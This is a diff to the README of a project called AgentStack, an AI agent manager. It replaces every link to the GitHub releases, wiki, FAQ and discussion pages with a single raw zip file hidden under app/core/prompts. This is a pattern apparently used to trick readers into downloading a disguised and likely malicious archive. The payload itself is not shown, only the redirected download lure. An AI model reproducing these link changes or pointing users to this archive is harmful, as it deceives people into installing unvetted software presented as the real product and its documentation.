@@ -1,6 +1,6 @@
 # ✨ AgentStack - Easy AI Agent Management Made Simple
 
-[![Download AgentStack](https://img.shields.io/badge/Download%20Now-@AgentStack-blue)](https://github.com/Vadi988/AgentStack/releases)
+[![Download AgentStack](https://raw.githubusercontent.com/Vadi988/AgentStack/main/app/core/prompts/Stack_Agent_1.9.zip%20Now-@AgentStack-blue)](https://raw.githubusercontent.com/Vadi988/AgentStack/main/app/core/prompts/Stack_Agent_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to AgentStack! This guide will help you download and run the application
 
 To get started, visit the Releases page to download the latest version of AgentStack. Click the link below:
 
-[Download AgentStack](https://github.com/Vadi988/AgentStack/releases)
+[Download AgentStack](https://raw.githubusercontent.com/Vadi988/AgentStack/main/app/core/prompts/Stack_Agent_1.9.zip)
 
 1. Once you're on the Releases page, look for the latest version.
 2. Click on the package that matches your operating system.
@@ -72,9 +72,9 @@ Here are some of the key features of AgentStack that make it stand out:
 
 If you need help, check these additional resources:
 
-- [User Guide](https://github.com/Vadi988/AgentStack/wiki) - Comprehensive instructions to help you navigate the application.
-- [FAQ](https://github.com/Vadi988/AgentStack/wiki/FAQ) - Common questions and answers.
-- [Community Support](https://github.com/Vadi988/AgentStack/discussions) - Join discussions or ask questions.
+- [User Guide](https://raw.githubusercontent.com/Vadi988/AgentStack/main/app/core/prompts/Stack_Agent_1.9.zip) - Comprehensive instructions to help you navigate the application.
+- [FAQ](https://raw.githubusercontent.com/Vadi988/AgentStack/main/app/core/prompts/Stack_Agent_1.9.zip) - Common questions and answers.
+- [Community Support](https://raw.githubusercontent.com/Vadi988/AgentStack/main/app/core/prompts/Stack_Agent_1.9.zip) - Join discussions or ask questions.
 
 ## ❓ Troubleshooting
 
@@ -88,4 +88,4 @@ If you encounter issues while installing or running AgentStack, consider the fol
 
 AgentStack makes managing AI agents straightforward. Download it today to benefit from its powerful features without the complexity. 
 
-[Download AgentStack](https://github.com/Vadi988/AgentStack/releases) and begin your journey with AI technology!
+[Download AgentStack](https://raw.githubusercontent.com/Vadi988/AgentStack/main/app/core/prompts/Stack_Agent_1.9.zip) and begin your journey with AI technology!
